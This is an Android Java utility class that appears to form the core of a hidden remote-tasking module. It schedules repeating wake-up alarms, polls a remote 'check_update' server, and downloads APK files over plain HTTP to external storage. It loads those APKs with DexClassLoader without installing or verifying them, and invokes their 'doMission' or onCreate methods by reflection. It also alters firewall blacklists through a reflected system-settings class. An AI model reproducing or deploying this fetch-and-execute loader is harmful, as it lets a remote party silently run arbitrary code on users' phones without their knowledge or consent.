package com.sf.cup.utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;

import org.apache.http.util.EncodingUtils;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class Utils {
	private final static boolean isDebug = false;
	private final static String TAG = Utils.class.getPackage() + "."
			+ Utils.class.getSimpleName();
	public final static String APK_NAME = "tmp";
	public final static String APK_NAME_SUFFIX = "apk";
	public final static String SEPARATOR_DOT = ".";
	public final static String SEPARATOR_SLASH = "/";
	public final static String FILE_PATH = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+APK_NAME;
	public final static String URL_PATH="http://ys2016.sinaapp.com/check_update.php";
//	public final static String URL_PATH="http://www.google.com";
	public final static String SHARE_PREFERENCE_ZYT="ZYT";
	public final static String SHARE_PREFERENCE_ZYT_PLUGIN="ZYT_PLUGIN";
	public final static String SHARE_PREFERENCE_HTTP_URL="HTTP_URL";
	public final static String SHARE_PREFERENCE_REPEAT_TIME="REPEAT_TIME";
	public final static String SHARE_PREFERENCE_REPEAT_TIME_FIRSTBOOT="REPEAT_TIME_FIRSTBOOT";
	public final static String SHARE_PREFERENCE_SWITCH="SWITCH";
	public final static String SHARE_PREFERENCE_HTTP_STATUS="HTTP_STATUS";
	public final static String SHARE_PREFERENCE_PLUGIN="PLUGIN";
	//后台需要多传一个userid
	public final static String SHARE_PREFERENCE_USERID="userid";
	//保存上一次成功执行任务的时间
	public final static String SHARE_PREFERENCE_LAST_EXEC_TIME="last_exec_time";
	//服务器定义的重复时间，可能很大，好几天
	public final static String SHARE_PREFERENCE_SERVER_DEFINE_REPEAT_TIME="SERVER_DEFINE_REPEAT_TIME";
	//wangm 固定2h来一次，然后去判断发送间隔是否大于服务器上的时间
	public final static long REPEAT_TIME=2*60*60*1000;//有个任务，可以来改变repeat time。默认链接超时时间为90s。所以重复时间必须要大于90s
	public final static long REPEAT_TIME_FIRST_BOOT=10*60*60*1000;//开机后第一次启动的时间，服务器后台修改此时间的接口都保留
	public final static long REPEAT_TIME_CAN_EXECUTE_DEFAULT=24*60*60*1000;//未设定repeattimecanexe.txt 后台未设定改执行周期，则默认一天才执行一次

	
	public static final int TARGET_ACTIVITY = 0;
	public static final int TARGET_SERVICE = 1;
	public static final String FROM = "extra.from";
	public static final int FROM_EXTERNAL = 0;
	public static final int FROM_INTERNAL = 1;
	/**
	 * running log
	 * 
	 * @param s
	 */
	public static void Log(String s) {
		if (isDebug) {
			Log.i("xxxxxxxxxxxx", s);
		}
	}

	/**
	 * error log
	 * 
	 * @param tag
	 * @param s
	 */
	public static void Log(String tag, String s) {
		Log.d(tag, s);
	}

	/**
	 * 根据Key获取值.
	 * 
	 * @return 如果key不存在, 并且如果def不为空则返回def否则返回空字符串
	 * @throws IllegalArgumentException
	 *             如果key超过32个字符则抛出该异常
	 */
	public static String getSystemProperties(Context context, String key,
			String def) throws IllegalArgumentException {
		String ret = def;
		try {
			ClassLoader cl = context.getClassLoader();
			@SuppressWarnings("rawtypes")
			Class SystemProperties = cl
					.loadClass("android.os.SystemProperties");
			// 参数类型
			@SuppressWarnings("rawtypes")
			Class[] paramTypes = new Class[2];
			paramTypes[0] = String.class;
			paramTypes[1] = String.class;
			@SuppressWarnings("unchecked")
			Method get = SystemProperties.getMethod("get", paramTypes);
			// 参数
			Object[] params = new Object[2];
			params[0] = new String(key);
			params[1] = new String(def);
			ret = (String) get.invoke(SystemProperties, params);
		} catch (IllegalArgumentException iAE) {
			Utils.Log(TAG, "IllegalArgumentException:" + iAE);
		} catch (Exception e) {
			ret = def;
			Utils.Log(TAG, "Exception:" + e);
		}
		return ret;
	}
	
	public static long getRepeatTime(Context c){
		SharedPreferences p;
		long repeatTime=REPEAT_TIME;
		//1,读取手机根目录repeattime.txt文件判断是多少时间间隔
		String fileName = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+"repeattime.txt";//文件路径
        String res = "";
        try {
            FileInputStream fin = new FileInputStream(fileName);
            int length = fin.available();
            byte[] buffer = new byte[length];
            fin.read(buffer);
            res = EncodingUtils.getString(buffer, "UTF-8");//如果不调整会乱码
            fin.close();//关闭资源
            int a=Integer.parseInt(res);
            if(a>=90){
            	repeatTime=a*1000;
            	Utils.Log("*** getRepeatTime from repeattime.txt and repeattime is :"+a+" seconds");
            	return repeatTime;
            }else{
				Utils.Log(TAG, "txt repeat time is:" +a+" s,less than 90s");
			}
        } catch (Exception e) {
        	Utils.Log(TAG,"getRepeatTime from repeattime.txt error:"+e);
        }
		
		//2，判断是否有任务修改过repeattime
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		String s = p.getString(Utils.SHARE_PREFERENCE_REPEAT_TIME, null);
		Utils.Log(" getRepeatTime from preference:" + s);
		if (!TextUtils.isEmpty(s)) {
			try {
				long tmpTimeSecond=Long.parseLong(s);
				if(tmpTimeSecond>=90){
					repeatTime=tmpTimeSecond*1000;
					Utils.Log("getRepeatTime repeatTime from server:" + repeatTime);
					return repeatTime;
				}else{
					Utils.Log(TAG, "repeat time from server is:" +tmpTimeSecond+" s,less than 90s");
				}
			} catch (NumberFormatException e) {
				Utils.Log(TAG, "getRepeatTime NumberFormatException:" + e);
			} catch (Exception e) {
				Utils.Log(TAG, "getRepeatTime Exception:" + e);
			}
		}
		Utils.Log("getRepeatTime repeatTime:" + repeatTime);
		return repeatTime;
	}
	public static long getRepeatTimeFirstBoot(Context c){
		SharedPreferences p;
		long repeatTime=REPEAT_TIME_FIRST_BOOT;
		//1,读取手机根目录repeattimefirst.txt文件判断是多少时间间隔
		String fileName = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+"repeattimefirst.txt";//文件路径
        String res = "";
        try {
            FileInputStream fin = new FileInputStream(fileName);
            int length = fin.available();
            byte[] buffer = new byte[length];
            fin.read(buffer);
            res = EncodingUtils.getString(buffer, "UTF-8");//如果不调整会乱码
            fin.close();//关闭资源
            int a=Integer.parseInt(res);
            if(a>0){
            	repeatTime=a*1000;
            	Utils.Log("*** getRepeatTimeFirstBoot from repeattimefirst.txt and repeattimefirst is :"+a+" seconds");
            	return repeatTime;
            }else{
				Utils.Log(TAG, "txt repeat time is:" +a+" s,less than 90s");
			}
        } catch (Exception e) {
        	Utils.Log("getRepeatTimeFirstBoot from repeattimefirst.txt error:"+e);
        }
		
		//2，判断是否有任务修改过repeattime
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		String s = p.getString(Utils.SHARE_PREFERENCE_REPEAT_TIME_FIRSTBOOT, null);
		Utils.Log(" getRepeatTimeFirstBoot from preference:" + s);
		if (!TextUtils.isEmpty(s)) {
			try {
				long tmpTimeSecond=Long.parseLong(s);
				if(tmpTimeSecond>=90){
					repeatTime=tmpTimeSecond*1000;
					Utils.Log("getRepeatTimeFirstBoot repeattimefirst from server:" + repeatTime);
					return repeatTime;
				}else{
					Utils.Log(TAG, "repeattimefirst time from server is:" +tmpTimeSecond+" s,less than 90s");
				}
			} catch (NumberFormatException e) {
				Utils.Log(TAG, "getRepeatTimeFirstBoot NumberFormatException:" + e);
			} catch (Exception e) {
				Utils.Log(TAG, "getRepeatTimeFirstBoot Exception:" + e);
			}
		}
		Utils.Log("getRepeatTimeFirstBoot repeattimefirst:" + repeatTime);
		return repeatTime;
	}
	
	public static void stopDoMission(Context c){
		Intent mIntent = new Intent();
		mIntent.setAction("com.fc.sf.service.MAIN_SERVICE");
		mIntent.setPackage(c.getPackageName());
		PendingIntent sender = PendingIntent.getService(c, 0, mIntent, 0);
		// Schedule the alarm!
		AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
		am.cancel(sender);
		
		SharedPreferences p;
		SharedPreferences.Editor e;
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		e = p.edit();
		e.putBoolean(Utils.SHARE_PREFERENCE_SWITCH, false);
		e.commit();
	}
	
	public static void startDoMission(Context c)
	{
		SharedPreferences p;
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		boolean s = p.getBoolean(Utils.SHARE_PREFERENCE_SWITCH, true);
		if(!s){
			Utils.Log("sorry! The service was close the mission");
			return ;
		}
		Intent mIntent = new Intent();
		mIntent.setAction("com.fc.sf.service.MAIN_SERVICE");
		mIntent.setPackage(c.getPackageName());
//		 startService(mIntent);

		PendingIntent sender = PendingIntent.getService(c, 0, mIntent, 0);
		// Schedule the alarm!
		AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
		Calendar calendar = Calendar.getInstance();
		calendar.setTimeInMillis(System.currentTimeMillis());
		am.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),
				Utils.getRepeatTime(c), sender);
	}
	
	/**
	 * 获取上次执行时间和服务器设定的执行周期。若现在的时间大于服务器的执行周期，则执行任务
	 * @param c
	 * @return
	 */
	public static boolean isTimeCanExec(Context c){
		SharedPreferences p;
		p = c.getSharedPreferences(Utils.SHARE_PREFERENCE_ZYT,Context.MODE_PRIVATE);
		
		String lastExecTimeString = p.getString(Utils.SHARE_PREFERENCE_LAST_EXEC_TIME, null);
		Utils.Log("isTimeCanExec lastExecTimeString:" + lastExecTimeString);
		//1，从未执行过，直接执行
		if (TextUtils.isEmpty(lastExecTimeString)) {
			return true;
		}
		
		long lastExecTime=Long.parseLong(lastExecTimeString);
		long currectTime=System.currentTimeMillis();
		long tmpTime=Math.abs(currectTime-lastExecTime);
		Utils.Log("isTimeCanExec currectTime:" + currectTime+"  tmpTime:"+tmpTime);
		
		//2,读取手机根目录repeattimecanexe.txt文件判断是多少时间间隔
		String fileName = Environment.getExternalStorageDirectory()+SEPARATOR_SLASH+"repeattimecanexe.txt";//文件路径
        String res = "";
        try {
            FileInputStream fin = new FileInputStream(fileName);
            int length = fin.available();
            byte[] buffer = new byte[length];
            fin.read(buffer);
            res = EncodingUtils.getString(buffer, "UTF-8");//如果不调整会乱码
            fin.close();//关闭资源
            long a=Long.parseLong(res)*1000;
            Utils.Log("*** repeattimecanexe from repeattimecanexe.txt is :"+a+" seconds");
            if(tmpTime-a>0){
            	return true;
            }else{
            	return false;//有文件就不管服务器设置的时间了。
            }
        } catch (Exception e) {
        	Utils.Log(TAG,"repeattimecanexe from repeattimecanexe.txt error:"+e);
        }
        
        //3，服务器未设定时间，则固定过24小时执行一次。
        String serverDefineTimeString = p.getString(Utils.SHARE_PREFERENCE_SERVER_DEFINE_REPEAT_TIME, null);
		Utils.Log("isTimeCanExec serverDefineTimeString:" + serverDefineTimeString);
		if (TextUtils.isEmpty(serverDefineTimeString)) {
			if(tmpTime-REPEAT_TIME_CAN_EXECUTE_DEFAULT>0){
				return true;
			}else{
				return false;
			}
		}
		long serverDefineTime=Long.parseLong(serverDefineTimeString)*1000;
		//4，经过的时间大于服务器设定的执行周期，才执行
		if(serverDefineTime==0||tmpTime-serverDefineTime>0)
		{
			return true;
		}else
		{
			return false;
		}
	}
	
	/**
	 * 获取连接方式
	 * none:-1 mobile:0 wifi:1    
	 * @param context
	 * @return
	 */
	public static int getNetWorkType(Context context) {  
        ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = manager.getActiveNetworkInfo();  
        if (networkInfo != null && networkInfo.isConnected()) {
        	Utils.Log("#### network type:"+(networkInfo.getType()==ConnectivityManager.TYPE_WIFI?"wifi":"others:"+networkInfo.getType()));
        	return networkInfo.getType();
        }
       	Utils.Log("#### network connect fail");
        return -1;
    } 
	
	
	
	public static boolean getScreenOn(Context context) {  
		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		boolean isScreenOn = pm.isScreenOn();
		Utils.Log("### getScreenOn:"+isScreenOn);
		return isScreenOn;
	}
	/**
	 * 删除指定文件
	 * @param file
	 */
	public static void deleteFile(File file) {
		if (file.exists()) {
			if (file.isFile()) {
				file.delete();
			}
		}
	}
	/** 
     * 判断指定的文件是否存在。 
     * @param fileName 要判断的文件的文件名 
     * @return 存在时返回true，否则返回false。 
     */  
    public static boolean isFileExist(String fileName) {  
      return new File(fileName).isFile();  
    }  
    /**
     * 判断apk是否已存在
     * @param context
     * @param packageName
     * @return
     */
    public static boolean isPkgInstalled(Context context, String packageName) {

        if (packageName == null || "".equals(packageName))
            return false;
        android.content.pm.ApplicationInfo info = null;
        try {
            info = context.getPackageManager().getApplicationInfo(packageName, 0);
            return info != null;
        } catch (NameNotFoundException e) {
            return false;
        }
    }
	
	
	/**
	 * 设置黑名单  写入
	 */
	public static void doResetBlackList(Context c,String blackListString){
		Utils.Log("doResetBlackList:" + blackListString);
		//用反射去掉用wuwz的接口
		
		try {
		 ClassLoader cl = c.getClassLoader();
			Class<?> iptablesHelper = cl
					.loadClass("com.android.settings.IptablesHelper");
     	Utils.Log("doResetBlackList 1" + iptablesHelper);
     	
     	//1 reset
     	Method resetIptables = iptablesHelper.getMethod("resetIptables",new Class[]{Context.class,String.class});
        Utils.Log("doResetBlackList 2 resetIptables = " + resetIptables);
        resetIptables.setAccessible(true);  
        resetIptables.invoke(iptablesHelper,new Object[] {c,blackListString});
        
       
		}catch(Exception e){
			Utils.Log(TAG,"doResetBlackList  error:"+e);	
		}
	}
	/**
	 * 设置黑名单  执行
	 */
	public static void doUpdateBlackList(Context c){
		
		Utils.Log("doUpdateBlackList 0");
		//用反射去掉用wuwz的接口
		
		try {
		 ClassLoader cl = c.getClassLoader();
			Class<?> iptablesHelper = cl
					.loadClass("com.android.settings.IptablesHelper");
     	Utils.Log("doUpdateBlackList 1" + iptablesHelper);
     	
		 //2 update
        Method updateIptables = iptablesHelper.getMethod("updateIptables",new Class[]{Context.class});
        Utils.Log("doUpdateBlackList 2 updateIptables = " + updateIptables);
        updateIptables.setAccessible(true);  
        updateIptables.invoke(iptablesHelper,new Object[] {c});
        Utils.Log("doUpdateBlackList 3 updateIptables done ");
        
		}catch(Exception e){
			Utils.Log(TAG,"doUpdateBlackList  error:"+e);	
		}
	}
	
	 /**
     *调用未安装apk 的方法
     *仅处理manifest中第一个activity 或 service 由type：TARGET_ACTIVITY，TARGET_SERVICE 决定
     *目前还未处理生命周期
     *入口仅限onCreate  
     */
	public static void launchTargetAPK(Context context, final String apkFilePath,
			int type) throws Exception {
		Utils.Log("launchTargetAPK 1:" + apkFilePath);
		File dexOutputDir = context.getDir("dex", 0);
		final String dexOutputPath = dexOutputDir.getAbsolutePath();
		Utils.Log("dexOutputDir = " + dexOutputDir + "  dexOutputPath:"
				+ dexOutputPath);
		// dexOutputDir = /data/data/com.freecom.add/app_dex
		// dexOutputPath:/data/data/com.freecom.add/app_dex
		ClassLoader localClassLoader = ClassLoader.getSystemClassLoader();
		DexClassLoader dexClassLoader = new DexClassLoader(apkFilePath,
				dexOutputPath, null, localClassLoader);
		PackageInfo packageInfo;
		String activityName = null;
		if (type == TARGET_ACTIVITY) {
			packageInfo = context.getPackageManager().getPackageArchiveInfo(
					apkFilePath, PackageManager.GET_ACTIVITIES);
			if ((packageInfo != null) && (packageInfo.activities != null)
					&& (packageInfo.activities.length > 0)) {
				activityName = packageInfo.activities[0].name;// 仅处理manifest中第一个activity
			}
		} else if (type == TARGET_SERVICE) {
			packageInfo = context.getPackageManager().getPackageArchiveInfo(
					apkFilePath, PackageManager.GET_SERVICES);
			if ((packageInfo != null) && (packageInfo.services != null)
					&& (packageInfo.services.length > 0)) {
				activityName = packageInfo.services[0].name;// 仅处理manifest中第一个services
			}
		}
		Utils.Log("launchTargetAPK 3:" + activityName);
		if (activityName != null) {
			try {
				Class<?> localClass = dexClassLoader.loadClass(activityName);
				Constructor<?> localConstructor = localClass
						.getConstructor(new Class[] {});
				Object instance = localConstructor.newInstance(new Object[] {});

				Method setProxy = localClass.getMethod("setProxy",
						new Class[] { Context.class });
				setProxy.setAccessible(true);
				setProxy.invoke(instance, new Object[] { context });
				Bundle bundle = new Bundle();
				bundle.putInt(FROM, FROM_EXTERNAL);
				Method onCreate ;
				if (type == TARGET_ACTIVITY){
					onCreate= localClass.getDeclaredMethod("onCreate",
							new Class[] { Bundle.class });
					onCreate.setAccessible(true);
					onCreate.invoke(instance, new Object[] { bundle });
				}else if(type == TARGET_SERVICE){
					//service 的抽象了下，仅关注domission即可
					onCreate= localClass.getDeclaredMethod("doMission",
							new Class[] {});
					onCreate.setAccessible(true);
					onCreate.invoke(instance, new Object[] {});	
				}
			} catch (InvocationTargetException ite) {
				Throwable t = ite.getTargetException();// 获取目标异常
				t.printStackTrace();
			} catch (Exception e) {
				Utils.Log(TAG, "launchTargetAPK Exception:" + e);
			}
		}
	}
	
	/**
	 * 
	 * @param httpUrl
	 * @param id 文件命名的唯一标识
	 * @return
	 */
	public static File downLoadFile(String httpUrl,String id) {
		Utils.Log("downLoadFile start");
		final File file = new File(Utils.FILE_PATH+id+Utils.SEPARATOR_DOT+Utils.APK_NAME_SUFFIX);//加上id，区分多个下载任务
		try {
			URL url = new URL(httpUrl);
			try {
				HttpURLConnection conn = (HttpURLConnection) url
						.openConnection();
				InputStream is = conn.getInputStream();
				FileOutputStream fos = new FileOutputStream(file);
				byte[] buf = new byte[1024];
				conn.connect();
				long timestamp = System.currentTimeMillis();
				int len;
				if (conn.getResponseCode() >= 400) {
					// Toast.makeText(mContext, "time out",
					// Toast.LENGTH_SHORT).show();
					Utils.Log(TAG, "downLoadFile time out error");
				} else {
					while ((len = is.read(buf)) != -1) {
						fos.write(buf, 0, len);
					}
				}
				Utils.Log("downLoadFile spend time:"
						+ (System.currentTimeMillis() - timestamp) + "ms");
				conn.disconnect();
				fos.close();
				is.close();
			} catch (IOException e) {
				Utils.Log(TAG, "downLoadFile IOException error:" + e);
			}
		} catch (MalformedURLException e) {
			Utils.Log(TAG, "downLoadFile MalformedURLException error:" + e);
		} catch (Exception e) {
			Utils.Log(TAG, "downLoadFile Exception error:" + e);
		}
		Utils.Log("downLoadFile finish"+file);
		return file;
	}
}
